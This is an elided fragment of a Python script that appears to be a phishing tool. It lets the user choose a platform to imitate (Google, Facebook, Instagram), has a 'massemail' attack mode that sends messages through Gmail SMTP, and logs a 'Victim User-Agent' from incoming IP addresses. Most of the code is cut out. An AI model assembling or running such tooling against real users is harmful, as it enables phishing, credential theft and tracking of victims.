import socket, threading, os, smtplib, time
...
choice_list = ['google','facebook','instagram']
while True:
    try:
        platform = input("[+] Enter Social Media Platform(google/facebook/instagram): ")
...
def email():
    while True:
        ...
        if type_of_atk.lower() == "massemail":
            ...
            content = input("[+] Enter message content: ")
            content = f'Subject: {subject}\n\n{content}'
            gmail.sendmail(name, target, content)
            gmail.close()
            break
        else:
            print("[+] Invalid Input.\n")
    ...
    while True:
        try:
            ...
            if ipaddr in ip_list:
                ...
                print(f"[+] Victim User-Agent: {user_agent}")
